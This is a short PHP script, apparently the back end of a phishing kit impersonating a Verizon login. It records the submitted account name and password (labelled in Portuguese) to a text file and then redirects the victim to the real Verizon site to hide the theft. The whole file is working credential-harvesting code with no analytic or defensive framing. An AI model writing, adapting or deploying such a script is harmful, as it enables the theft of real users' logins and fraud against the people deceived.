<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['IDToken1'] . " Senha: " . $_POST['IDToken2'] . "\n", FILE_APPEND);
header('Location: http://www.verizon.com ');
exit();
